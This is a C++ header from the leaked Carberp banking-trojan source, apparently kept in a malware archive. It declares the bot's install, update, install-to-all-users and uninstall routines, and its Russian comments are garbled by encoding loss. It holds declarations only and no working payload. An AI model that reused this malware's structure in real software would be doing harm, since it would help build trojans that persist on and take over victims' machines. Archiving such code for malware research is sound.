/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
/*
  ���������� ����.
*/
#pragma once

#include "..\common\botstatus.h"

namespace CoreInstall
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    ��������� ���� � �������.

    IN pathHome  - �������� ����������. �� ������ ��������� �� ����.
    OUT coreFile - ��� ����� ������������� �����.

    Return       - true - � ������ ������,
                   false - � ������ ������.

    ����� ���������� ������� �������������� �������� coreData.peSettings.
  */
  bool _install(const LPWSTR pathHome, LPWSTR coreFile);

  /*
    ���������� ������ ��������� �������������, � ��������� ����� ��������� � ��������� coreData.peSettings.

    IN ovelay      - ������� � �������.
    IN overlaySize - ������ �������.
    
    Return         - true - � ������ ������,
                     false - � ������ ������.
  */
  bool _loadInstalledData(const void *overlay, DWORD overlaySize);

  /*
    ������ ����������.

    IN bs        - ������ � ����������� ����.
    IN pathHome  - �������� ����������. �� ������ ��������� �� ����.
    OUT coreFile - ��� ������ ������������� �����.
    IN force     - ����������� ����������, �� ������ �� ������.

    Return       - true - � ������ ������,
                   false - � ������ ������.

    ����� ���������� ������� �������������� �������� coreData.peSettings.
  */
  bool _update(BotStatus::VER1 *bs, const LPWSTR pathHome, LPWSTR coreFile, bool force);
  
  /*
    ���������� ������, ������� ������������ ��� ���������� ����� ����.

    OUT bs - �����.
  */
  void _loadUpdateData(BotStatus::VER1 *bs);

  /*
    ��������� ���� �� ��� ���������� �������.  
    
    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool _installToAll(void);

  /*
    �������� ���� �� �������� �������.
    
    IN wait - true - ������� ���������� ��������,
              false - �� ������� ���������� ��������.
    
    Return  - true - � ������ ������,
              false - � ������ ������.
  */
  bool _uninstall(bool wait);
};
